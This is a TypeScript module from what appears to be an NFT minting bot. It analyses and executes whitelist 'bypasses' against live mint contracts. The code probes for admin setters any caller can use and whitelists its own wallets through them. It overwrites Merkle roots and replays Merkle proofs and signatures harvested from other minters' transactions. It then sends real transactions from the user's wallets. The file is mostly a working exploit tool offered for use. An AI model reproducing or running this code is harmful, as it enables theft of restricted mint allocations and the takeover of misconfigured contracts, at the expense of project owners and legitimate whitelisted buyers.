import {
  type Address,
  type Hex,
  type Abi,
  type AbiFunction,
  getAddress,
  getFunctionSelector,
  keccak256,
  encodePacked,
  encodeAbiParameters,
  encodeFunctionData,
  decodeFunctionData,
} from "viem";
import { getPublicClient, getWalletClient } from "./chain.js";
import { prisma } from "../db/client.js";
import { fetchContractAbi } from "./scanner.js";
import { auditContractSecurity } from "./security.js";
import { getActiveWallets, getWalletPrivateKey } from "./wallet.js";
import { assertGasSafe } from "./gasGuard.js";
import { batchMint } from "./mint.js";

export type GateType = "mapping" | "merkle" | "signature" | "balance_or_phase" | "none" | "unknown";

export interface GateFingerprint {
  gateType: GateType;
  whitelistViews: string[];
  merkleRootPresent: boolean;
  merkleRootValue: string | null;
  merkleMintFunctions: string[];
  signatureMintFunctions: string[];
  openAdminSetters: Array<{ name: string; signature: string }>;
  notes: string[];
}

export interface BypassStrategy {
  id: string;
  name: string;
  description: string;
  executable: boolean;
  dryRun: { success: boolean; error?: string };
}

export interface BypassReport {
  contractAddress: string;
  fingerprint: GateFingerprint;
  strategies: BypassStrategy[];
  summary: string;
}

export interface BypassExecutionResult {
  walletLabel: string;
  walletAddress: string;
  success: boolean;
  txHash?: string;
  error?: string;
}

export interface BypassExecutionOutcome {
  contractAddress: string;
  strategyId: string;
  results: BypassExecutionResult[];
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function onlyFunctions(abi: Abi): AbiFunction[] {
  return abi.filter((i) => i.type === "function") as AbiFunction[];
}

const MINT_NAME_RE = /mint|claim|collect/i;
const WL_TARGET_RE = /whitelist|allowlist|allowed|minter|merkle|\bwl\b/i;
const ADMIN_ACTION_RE = /^(add|set|update|grant|approve|enable|activate|open|unpause|remove|revoke|disable)/i;
const EXPLICIT_SETTERS = new Set([
  "addToWhitelist", "addWhitelisted", "setWhitelist", "setWhitelisted",
  "addToAllowlist", "addAllowed", "setAllowed", "addMinter", "setMinter",
  "updateMinter", "setMerkleRoot", "updateMerkleRoot", "setWhitelistEnabled",
  "enableWhitelist", "disableWhitelist", "whitelistUser", "setWhitelistRoot",
  "setRoot", "grantRole", "unpause", "setPaused",
]);

function isAdminSetterName(name: string): boolean {
  const n = name;
  if (EXPLICIT_SETTERS.has(n)) return true;
  return ADMIN_ACTION_RE.test(n) && WL_TARGET_RE.test(n);
}

function isViewOnly(fn: AbiFunction): boolean {
  return fn.stateMutability === "view" || fn.stateMutability === "pure";
}

// Build calldata args for an ABI function. Proofs/signatures are injected
// where the parameter types demand them.
function buildArgs(
  fn: AbiFunction,
  from: Address,
  extras?: { proof?: string[]; signature?: string }
): unknown[] {
  return fn.inputs.map((inp) => {
    const t = inp.type;
    const n = (inp.name ?? "").toLowerCase();
    if (t === "address") return from;
    if (t.startsWith("bytes32[")) return extras?.proof ?? [];
    if (t === "bytes32") {
      if (extras?.signature && (n.includes("sig") || n.includes("signature"))) {
        return extras.signature as Hex;
      }
      return ("0x" + "00".repeat(31) + "01") as Hex;
    }
    if (t.startsWith("bytes")) return (extras?.signature ?? "0x") as Hex;
    if (t.startsWith("uint") || t.startsWith("int")) return 1n;
    if (t === "bool") return true;
    return "0x";
  });
}

async function simulateCall(
  contractAddress: Address,
  fn: AbiFunction,
  args: unknown[],
  from: Address
): Promise<{ success: boolean; error?: string }> {
  try {
    const data = encodeFunctionData({
      abi: [fn] as Abi,
      functionName: fn.name,
      args: args as any,
    });
    await getPublicClient().call({ to: contractAddress, data, account: from, value: 0n });
    return { success: true };
  } catch (e) {
    return { success: false, error: e instanceof Error ? e.message : String(e) };
  }
}

// ---------------------------------------------------------------------------
// Fingerprinting
// ---------------------------------------------------------------------------

async function probeAdminSetters(
  contractAddress: Address,
  abi: Abi,
  attacker: Address
): Promise<Array<{ name: string; signature: string }>> {
  const open: Array<{ name: string; signature: string }> = [];

  for (const fn of onlyFunctions(abi)) {
    if (isViewOnly(fn) || !isAdminSetterName(fn.name)) continue;

    // Skip multi-arg setters we can't guess reliably.
    if (fn.inputs.length > 2) continue;

    let args: unknown[];
    if (fn.name === "setPaused") {
      args = [false];
    } else {
      args = fn.inputs.map((inp) => {
        const t = inp.type;
        if (t === "address") return attacker;
        if (t.startsWith("uint") || t.startsWith("int")) return 1n;
        if (t === "bool") return true;
        if (t === "bytes32") return ("0x" + "00".repeat(31) + "01") as Hex;
        if (t.startsWith("bytes")) return "0x";
        return null;
      });
      if (args.some((a) => a === null)) continue;
    }

    const sim = await simulateCall(contractAddress, fn, args, attacker);
    if (sim.success) {
      open.push({
        name: fn.name,
        signature: `${fn.name}(${fn.inputs.map((i) => i.type).join(",")})`,
      });
    }
  }

  return open;
}

async function readMerkleRoot(contractAddress: Address, abi: Abi): Promise<string | null> {
  for (const fn of onlyFunctions(abi)) {
    if (!isViewOnly(fn) || fn.inputs.length !== 0) continue;
    const out = fn.outputs?.[0]?.type;
    if (out !== "bytes32") continue;
    if (!/merkle|root/i.test(fn.name)) continue;
    try {
      const value = (await getPublicClient().readContract({
        address: contractAddress,
        abi: [fn] as Abi,
        functionName: fn.name,
      })) as string;
      return value;
    } catch {
      /* try next */
    }
  }
  return null;
}

// Pull real mint/claim calldata from BaseScan so we can harvest genuine
// Merkle proofs and signatures to replay (no account required).
async function harvestMintCalls(contractAddress: Address, abi: Abi, limit = 15) {
  const mintFns = onlyFunctions(abi).filter((f) => MINT_NAME_RE.test(f.name) && !isViewOnly(f));
  const bySelector = new Map<string, AbiFunction>();
  for (const f of mintFns) {
    try {
      bySelector.set(getFunctionSelector(f), f);
    } catch {
      /* skip malformed */
    }
  }
  if (bySelector.size === 0) return [];

  const apiKey = process.env.BASESCAN_API_KEY || "";
  const url =
    `https://api.basescan.org/api?module=account&action=txlist` +
    `&address=${contractAddress}&startblock=0&endblock=99999999&page=1&offset=${limit}&sort=desc&apikey=${apiKey}`;

  const out: Array<{ functionName: string; args: readonly unknown[] }> = [];
  try {
    const res = await fetch(url);
    if (!res.ok) return out;
    const json = (await res.json()) as any;
    if (json?.status !== "1" || !Array.isArray(json.result)) return out;

    for (const tx of json.result) {
      const input: string = tx.input ?? "0x";
      if (!input || input === "0x" || input.length < 10) continue;
      const fn = bySelector.get(input.slice(0, 10).toLowerCase());
      if (!fn) continue;
      try {
        const decoded = decodeFunctionData({ abi: [fn] as Abi, data: input as Hex });
        out.push({ functionName: decoded.functionName, args: decoded.args });
        if (out.length >= 5) break;
      } catch {
        /* skip undecodable */
      }
    }
  } catch (err) {
    console.warn(`Calldata harvest failed for ${contractAddress}:`, err);
  }
  return out;
}

function extractProof(args: readonly unknown[]): string[] | null {
  for (const a of args) {
    if (Array.isArray(a) && a.length > 0 && typeof a[0] === "string") {
      return a as string[];
    }
  }
  return null;
}

function extractSignature(fn: AbiFunction, args: readonly unknown[]): string | null {
  for (let i = 0; i < fn.inputs.length; i++) {
    const t = fn.inputs[i].type;
    if (t === "bytes32" || t.startsWith("bytes")) {
      const raw = args[i];
      if (typeof raw === "string" && raw.startsWith("0x") && raw.length > 2) return raw;
    }
  }
  return null;
}

function findMintFns(abi: Abi): AbiFunction[] {
  return onlyFunctions(abi).filter((f) => MINT_NAME_RE.test(f.name) && !isViewOnly(f));
}

function findClaimWithProof(abi: Abi): AbiFunction | null {
  const fns = findMintFns(abi).filter((f) => f.inputs.some((i) => i.type.startsWith("bytes32[")));
  if (fns.length === 0) return null;
  return (
    fns.find((f) => f.inputs.some((i) => (i.name ?? "").toLowerCase().includes("proof"))) ??
    fns[0]
  );
}

function findSigFn(abi: Abi): AbiFunction | null {
  const fns = findMintFns(abi).filter((f) =>
    f.inputs.some((i) => i.type === "bytes32" || i.type.startsWith("bytes"))
  );
  if (fns.length === 0) return null;
  return (
    fns.find((f) => f.inputs.some((i) => (i.name ?? "").toLowerCase().includes("sig"))) ??
    fns[0]
  );
}

function findRootSetter(abi: Abi): AbiFunction | null {
  return (
    onlyFunctions(abi).find(
      (f) => !isViewOnly(f) && /merkle|root/i.test(f.name) && f.inputs.some((i) => i.type === "bytes32")
    ) ?? null
  );
}

// ---------------------------------------------------------------------------
// Analysis (zero gas — pure eth_call)
// ---------------------------------------------------------------------------

export async function analyzeBypassOptions(
  contractAddress: string,
  attacker: Address
): Promise<BypassReport> {
  const ca = getAddress(contractAddress);
  const strategies: BypassStrategy[] = [];
  const notes: string[] = [];

  const { abi } = await fetchContractAbi(ca);
  if (!abi) {
    return {
      contractAddress: ca,
      fingerprint: {
        gateType: "unknown",
        whitelistViews: [],
        merkleRootPresent: false,
        merkleRootValue: null,
        merkleMintFunctions: [],
        signatureMintFunctions: [],
        openAdminSetters: [],
        notes: ["Contract source is unverified — ABI unavailable, analysis impossible"],
      },
      strategies: [],
      summary: "Contract source is unverified. Bypass analysis requires the verified ABI. Check the explorer for the verified source.",
    };
  }

  const functions = onlyFunctions(abi);
  const mintFns = findMintFns(abi);

  // --- whitelist views (mapping allowlist) ---
  const whitelistViews = functions
    .filter(
      (f) =>
        isViewOnly(f) &&
        f.inputs.length === 1 &&
        f.inputs[0].type === "address" &&
        f.outputs?.[0]?.type === "bool" &&
        WL_TARGET_RE.test(f.name)
    )
    .map((f) => `${f.name}(${f.inputs.map((i) => i.type).join(",")})`);

  // --- merkle ---
  const merkleRootValue = await readMerkleRoot(ca, abi);
  const merkleMintFunctions = mintFns
    .filter((f) => f.inputs.some((i) => i.type.startsWith("bytes32[")))
    .map((f) => `${f.name}(${f.inputs.map((i) => i.type).join(",")})`);

  // --- signature ---
  const signatureMintFunctions = mintFns
    .filter((f) => f.inputs.some((i) => i.type === "bytes32" || i.type.startsWith("bytes")))
    .map((f) => `${f.name}(${f.inputs.map((i) => i.type).join(",")})`);

  // --- admin setter probes (free eth_call) ---
  const openAdminSetters = await probeAdminSetters(ca, abi, attacker);
  if (openAdminSetters.length > 0) {
    notes.push(`Probed ${openAdminSetters.length} admin setter(s) that do NOT revert from a non-owner caller`);
  }

  // --- bytecode hint for ecrecover (signature verification) ---
  try {
    const bytecode = await getPublicClient().getBytecode({ address: ca });
    if (bytecode && bytecode.includes("73" + "0".repeat(38) + "01")) {
      notes.push("Bytecode references the ecrecover precompile — signature verification likely used");
    }
  } catch {
    /* ignore */
  }

  // --- gate type ---
  let gateType: GateType = "none";
  if (whitelistViews.length > 0 || openAdminSetters.some((s) => WL_TARGET_RE.test(s.name))) {
    gateType = "mapping";
  } else if (merkleRootValue !== null || merkleMintFunctions.length > 0) {
    gateType = "merkle";
  } else if (signatureMintFunctions.length > 0) {
    gateType = "signature";
  }

  // --- baseline: is the mint actually open right now? ---
  let mintOpen = false;
  let openFn: AbiFunction | null = null;
  for (const fn of mintFns) {
    const sim = await simulateCall(ca, fn, buildArgs(fn, attacker), attacker);
    if (sim.success) {
      mintOpen = true;
      openFn = fn;
      break;
    }
  }

  // --- harvest real proofs/signatures from past txs ---
  const harvested = await harvestMintCalls(ca, abi);
  const proofs: string[][] = [];
  const signatures: string[] = [];
  for (const h of harvested) {
    const fn = mintFns.find((f) => f.name === h.functionName);
    if (!fn) continue;
    const p = extractProof(h.args);
    if (p && proofs.length < 3) proofs.push(p);
    const s = extractSignature(fn, h.args);
    if (s && signatures.length < 3) signatures.push(s);
  }
  if (proofs.length > 0) notes.push(`Harvested ${proofs.length} real Merkle proof(s) from past mints`);
  if (signatures.length > 0) notes.push(`Harvested ${signatures.length} real signature(s) from past mints`);

  // -----------------------------------------------------------------------
  // Build strategies
  // -----------------------------------------------------------------------

  if (mintOpen && openFn) {
    strategies.push({
      id: "mint_open",
      name: "Mint is open",
      description: `\`${openFn.name}()\` simulates successfully from your wallet — no bypass needed.`,
      executable: true,
      dryRun: { success: true },
    });
  }

  for (const setter of openAdminSetters) {
    const isMerkleSetter = /merkle|root/i.test(setter.name);
    strategies.push({
      id: `open_setter_${setter.name}`,
      name: `Open setter: ${setter.name}`,
      description: isMerkleSetter
        ? `\`${setter.signature}\` is callable by ANYONE. If set to a root you control, Merkle claims pass.`
        : `\`${setter.signature}\` is callable by ANYONE — whitelist yourself, then mint normally.`,
      executable: true,
      dryRun: { success: true },
    });
  }

  const claimFn = findClaimWithProof(abi);
  if (gateType === "merkle" && claimFn) {
    if (merkleRootValue !== null && /^0x0+$/.test(merkleRootValue)) {
      const sim = await simulateCall(ca, claimFn, buildArgs(claimFn, attacker, { proof: [] }), attacker);
      strategies.push({
        id: "merkle_empty_root",
        name: "Merkle root is zero",
        description:
          "The stored merkle root is zero/unset. Some contracts accept an empty proof in this state.",
        executable: sim.success,
        dryRun: sim,
      });
    }

    const rootSetter = findRootSetter(abi);
    if (rootSetter && openAdminSetters.some((s) => /merkle|root/i.test(s.name))) {
      const setSim = await simulateCall(ca, rootSetter, [keccak256(encodePacked(["address"], [attacker]))], attacker);
      strategies.push({
        id: "merkle_rebuild_root",
        name: "Overwrite merkle root (root = your leaf)",
        description:
          "The merkle root setter is open. Set root = keccak(leaf) for your wallet, then claim with an empty proof. Standard OZ leaf encodings (packed and padded) are tried automatically.",
        executable: setSim.success,
        dryRun: setSim,
      });
    }

    if (proofs.length > 0) {
      for (let i = 0; i < proofs.length; i++) {
        const sim = await simulateCall(ca, claimFn, buildArgs(claimFn, attacker, { proof: proofs[i] }), attacker);
        strategies.push({
          id: `merkle_replay_${i}`,
          name: `Replay harvested proof #${i + 1}`,
          description:
            sim.success
              ? "A real proof from another minter validates for YOUR wallet — the leaf is not bound to the sender (classic Merkle bypass)."
              : "Harvested proof is bound to its original address — replay does not validate.",
          executable: sim.success,
          dryRun: sim,
        });
      }
    }
  }

  const sigFn = findSigFn(abi);
  if (gateType === "signature" && sigFn && signatures.length > 0) {
    for (let i = 0; i < signatures.length; i++) {
      const sim = await simulateCall(ca, sigFn, buildArgs(sigFn, attacker, { signature: signatures[i] }), attacker);
      strategies.push({
        id: `signature_replay_${i}`,
        name: `Replay harvested signature #${i + 1}`,
        description: sim.success
          ? "A real whitelist signature validates for YOUR wallet — signature is unbound/replayable (classic signature bypass)."
          : "Signature is bound to its original address — replay does not validate.",
        executable: sim.success,
        dryRun: sim,
      });
    }
  }

  if (strategies.length === 0) {
    const description =
      gateType === "balance_or_phase" || mintFns.length > 0
        ? "Simulation reverted. Likely a balance/ownership gate or a phase that is not open yet. Re-check after the public mint window opens, or investigate the off-chain mint site (JS bundle / whitelist API)."
        : "No mint/claim functions found in the ABI.";
    strategies.push({
      id: "no_bypass",
      name: "No on-chain bypass found",
      description,
      executable: false,
      dryRun: { success: false, error: "No exploitable path detected" },
    });
  } else if (!strategies.some((s) => s.executable)) {
    strategies.push({
      id: "no_bypass",
      name: "No executable bypass",
      description:
        "Gate is properly locked: owner-gated setters, sender-bound proofs/signatures. Remaining surface is off-chain (mint-site JS bundle, whitelist registration API).",
      executable: false,
      dryRun: { success: false, error: "No exploitable path detected" },
    });
  }

  // -----------------------------------------------------------------------
  // Summary
  // -----------------------------------------------------------------------
  let summary: string;
  const execCount = strategies.filter((s) => s.executable).length;
  if (openAdminSetters.length > 0) {
    summary = `🚨 ${openAdminSetters.length} admin setter(s) are callable by ANYONE — misconfigured contract, Playbook C confirmed.`;
  } else if (execCount > 0) {
    summary = `${execCount} executable bypass path(s) found. Dry-run validated.`;
  } else if (mintOpen) {
    summary = "Mint appears OPEN — no bypass needed.";
  } else {
    summary =
      "No on-chain bypass found — gate is properly locked. Off-chain surface (mint-site JS bundle / whitelist API) is the remaining option.";
  }

  return {
    contractAddress: ca,
    fingerprint: {
      gateType,
      whitelistViews,
      merkleRootPresent: merkleRootValue !== null,
      merkleRootValue,
      merkleMintFunctions,
      signatureMintFunctions,
      openAdminSetters,
      notes,
    },
    strategies,
    summary,
  };
}

// ---------------------------------------------------------------------------
// Execution (real txs — dry-run simulated first, then user-confirmed send)
// ---------------------------------------------------------------------------

async function logBypass(
  userId: bigint,
  contractAddress: string,
  strategy: string,
  status: string,
  detail?: string,
  txHash?: string
): Promise<void> {
  try {
    await prisma.bypassLog.create({
      data: { userId, contractAddress, strategy, status, detail: detail ?? "", txHash },
    });
  } catch (err) {
    console.error("Failed to record bypass log:", err);
  }
}

function rootCandidates(wallet: Address): Hex[] {
  const packed = keccak256(encodePacked(["address"], [wallet]));
  const padded = keccak256(encodeAbiParameters([{ type: "address" }], [wallet]));
  return [packed, padded];
}

async function sendAndWait(
  userId: bigint,
  walletId: string,
  to: Address,
  data: Hex
): Promise<{ txHash?: string; error?: string }> {
  try {
    await assertGasSafe(userId);
    const privateKey = await getWalletPrivateKey(walletId);
    const hexKey = (privateKey.startsWith("0x") ? privateKey : `0x${privateKey}`) as Hex;
    const txHash = await getWalletClient(hexKey).sendTransaction({ to, data, value: 0n });
    const receipt = await getPublicClient().waitForTransactionReceipt({ hash: txHash });
    if (receipt.status !== "success") return { error: "Transaction reverted on-chain", txHash };
    return { txHash };
  } catch (err) {
    return { error: err instanceof Error ? err.message : String(err) };
  }
}

export async function executeBypass(
  userId: bigint,
  contractAddress: string,
  strategyId: string
): Promise<BypassExecutionOutcome> {
  const ca = getAddress(contractAddress);
  const results: BypassExecutionResult[] = [];

  // Fail-closed security gate (same rule as the mint pipeline).
  const security = await auditContractSecurity(ca);
  if (!security.isSafe) {
    throw new Error(`Security gate closed: ${security.warnings.join("; ")}`);
  }

  const wallets = await getActiveWallets(userId);
  if (wallets.length === 0) {
    throw new Error("No active wallets. Toggle at least one wallet to ✅ before bypassing.");
  }

  const { abi } = await fetchContractAbi(ca);
  if (!abi) {
    throw new Error("Contract source is unverified — cannot build bypass calldata.");
  }

  const finish = async (walletLabel: string, walletAddress: string, success: boolean, txHash?: string, error?: string) => {
    results.push({ walletLabel, walletAddress, success, txHash, error });
    await logBypass(userId, ca, strategyId, success ? "SUCCESS" : "FAILED", error ?? "", txHash);
  };

  // ---- 1. Mint is already open: reuse the existing pipeline ----
  if (strategyId === "mint_open") {
    const bm = await batchMint(userId, ca);
    for (const r of bm.results) {
      await finish(r.label, r.walletAddress, r.success, r.txHash, r.error);
    }
    return { contractAddress: ca, strategyId, results };
  }

  // ---- 2. Open admin setter: whitelist each wallet, then mint ----
  if (strategyId.startsWith("open_setter_")) {
    const setterName = strategyId.slice("open_setter_".length);
    const setter = onlyFunctions(abi).find((f) => f.name === setterName && !isViewOnly(f));
    if (!setter) throw new Error(`Setter ${setterName} not found in ABI`);

    for (const w of wallets) {
      const addr = getAddress(w.address);
      const args = buildArgs(setter, addr);
      const data = encodeFunctionData({ abi: [setter] as Abi, functionName: setter.name, args: args as any });
      const sim = await simulateCall(ca, setter, args, addr);
      if (!sim.success) {
        await finish(w.label, w.address, false, undefined, `Setter simulation failed: ${sim.error}`);
        continue;
      }
      const sent = await sendAndWait(userId, w.id, ca, data);
      if (sent.error) {
        await finish(w.label, w.address, false, sent.txHash, sent.error);
      }
    }

    // Mint with the existing (now whitelisted) pipeline.
    const bm = await batchMint(userId, ca);
    for (const r of bm.results) {
      await finish(r.label, r.walletAddress, r.success, r.txHash, r.error);
    }
    return { contractAddress: ca, strategyId, results };
  }

  // ---- 3. Merkle / signature direct-mint strategies ----
  const claimFn = findClaimWithProof(abi);
  const sigFn = findSigFn(abi);

  const runPerWallet = async (fn: AbiFunction, extras: { proof?: string[]; signature?: string }) => {
    for (const w of wallets) {
      const addr = getAddress(w.address);
      const args = buildArgs(fn, addr, extras);
      const data = encodeFunctionData({ abi: [fn] as Abi, functionName: fn.name, args: args as any });
      const sim = await simulateCall(ca, fn, args, addr);
      if (!sim.success) {
        await finish(w.label, w.address, false, undefined, `Simulation failed: ${sim.error}`);
        continue;
      }
      const sent = await sendAndWait(userId, w.id, ca, data);
      if (sent.error) {
        await finish(w.label, w.address, false, sent.txHash, sent.error);
      } else {
        await finish(w.label, w.address, true, sent.txHash);
      }
    }
  };

  if (strategyId === "merkle_empty_root" && claimFn) {
    await runPerWallet(claimFn, { proof: [] });
    return { contractAddress: ca, strategyId, results };
  }

  if (strategyId.startsWith("merkle_replay_") && claimFn) {
    const idx = Number(strategyId.slice("merkle_replay_".length));
    const harvested = await harvestMintCalls(ca, abi);
    const proofs: string[][] = [];
    for (const h of harvested) {
      const p = extractProof(h.args);
      if (p && proofs.length < 3) proofs.push(p);
    }
    const proof = proofs[idx];
    if (!proof) throw new Error(`Harvested proof #${idx} unavailable — no recent mint txs found`);
    await runPerWallet(claimFn, { proof });
    return { contractAddress: ca, strategyId, results };
  }

  if (strategyId.startsWith("signature_replay_") && sigFn) {
    const idx = Number(strategyId.slice("signature_replay_".length));
    const harvested = await harvestMintCalls(ca, abi);
    const signatures: string[] = [];
    for (const h of harvested) {
      const s = extractSignature(sigFn, h.args);
      if (s && signatures.length < 3) signatures.push(s);
    }
    const signature = signatures[idx];
    if (!signature) throw new Error(`Harvested signature #${idx} unavailable — no recent mint txs found`);
    await runPerWallet(sigFn, { signature });
    return { contractAddress: ca, strategyId, results };
  }

  // ---- 4. Root-replace: set root = your leaf, then claim with empty proof ----
  if (strategyId === "merkle_rebuild_root") {
    const rootSetter = findRootSetter(abi);
    const claimFn2 = findClaimWithProof(abi);
    if (!rootSetter || !claimFn2) {
      throw new Error("Root setter or claim function not found in ABI");
    }

    for (const w of wallets) {
      const addr = getAddress(w.address);
      let done = false;

      for (const candidate of rootCandidates(addr)) {
        try {
          const setArgs = [candidate];
          const setData = encodeFunctionData({
            abi: [rootSetter] as Abi,
            functionName: rootSetter.name,
            args: setArgs as any,
          });
          const setSim = await simulateCall(ca, rootSetter, setArgs, addr);
          if (!setSim.success) continue;

          const sentRoot = await sendAndWait(userId, w.id, ca, setData);
          if (sentRoot.error) continue;

          const claimArgs = buildArgs(claimFn2, addr, { proof: [] });
          const claimSim = await simulateCall(ca, claimFn2, claimArgs, addr);
          if (!claimSim.success) continue;

          const claimData = encodeFunctionData({
            abi: [claimFn2] as Abi,
            functionName: claimFn2.name,
            args: claimArgs as any,
          });
          const sentClaim = await sendAndWait(userId, w.id, ca, claimData);
          if (sentClaim.error) {
            await finish(w.label, w.address, false, sentClaim.txHash, `Claim failed after root set: ${sentClaim.error}`);
          } else {
            await finish(w.label, w.address, true, sentClaim.txHash);
          }
          done = true;
          break;
        } catch (err) {
          /* try next candidate */
        }
      }

      if (!done) {
        await finish(w.label, w.address, false, undefined, "Root-replace claim failed for all leaf encodings (packed/padded)");
      }
    }
    return { contractAddress: ca, strategyId, results };
  }

  throw new Error(`Unknown strategy: ${strategyId}. Re-run /bypass to list valid strategy ids.`);
}
